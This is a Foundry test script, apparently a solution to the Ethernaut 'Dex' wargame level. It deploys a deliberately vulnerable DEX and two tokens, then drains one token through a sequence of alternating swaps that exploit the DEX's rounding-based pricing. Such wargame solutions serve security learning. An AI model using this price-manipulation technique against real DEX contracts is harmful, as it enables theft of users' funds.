// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {Dex, SwappableToken} from "../instances/Ilevel22.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract Attacker is Test {
    function test() external {
        vm.startBroadcast();
        console.log("EOA sender: %s", msg.sender);
        Dex dex = new Dex();
        SwappableToken token1 = new SwappableToken(
            address(dex),
            "token1",
            "token1",
            10000
        );
        SwappableToken token2 = new SwappableToken(
            address(dex),
            "token2",
            "token2",
            10000
        );
        token1.approve(msg.sender, address(dex), 100);
        token2.approve(msg.sender, address(dex), 100);
        dex.addLiquidity(address(token1), 100);
        dex.addLiquidity(address(token2), 100);

        dex.setTokens(address(token1), address(token2));
        dex.approve(address(dex), 500);
        dex.swap(address(token1), address(token2), 10);
        dex.swap(address(token2), address(token1), 20);
        dex.swap(address(token1), address(token2), 24);
        dex.swap(address(token2), address(token1), 30);
        dex.swap(address(token1), address(token2), 41);
        dex.swap(address(token2), address(token1), 45);

        console.log(
            "Final token1 balance of Dex is : ",
            dex.balanceOf(address(token1), address(dex))
        );

        vm.stopBroadcast();
    }
}
